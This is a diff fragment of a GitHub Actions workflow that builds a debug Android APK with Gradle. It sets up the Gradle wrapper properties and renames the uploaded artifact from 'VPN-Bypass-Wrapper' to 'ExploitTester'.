+          cat > gradle/wrapper/gradle-wrapper.properties << 'EOF'
+          distributionBase=GRADLE_USER_HOME
+          distributionPath=wrapper/dists
+          distributionUrl=https\://services.gradle.org/distributions/gradle-8.0-bin.zip
+          zipStoreBase=GRADLE_USER_HOME
+          zipStorePath=wrapper/dists
+          EOF
+
+      - name: Grant execute permission to gradlew
         run: chmod +x gradlew
 
       - name: Build APK
-        run: ./gradlew assembleDebug --no-daemon --stacktrace
+        run: ./gradlew assembleDebug
 
-      - name: Upload APK artifact
+      - name: Upload APK
         uses: actions/upload-artifact@v4
         with:
-          name: VPN-Bypass-Wrapper
-          path: app/build/outputs/apk/debug/*.apk
-          compression-level: 0
-
-      - name: Upload mapping file (if exists)
-        uses: actions/upload-artifact@v4
-        with:
-          name: mapping-file
-          path: app/build/outputs/mapping/debug/mapping.txt
-          if-no-files-found: ignore
+          name: ExploitTester
+          path: app/build/outputs/apk/debug/app-debug.apk
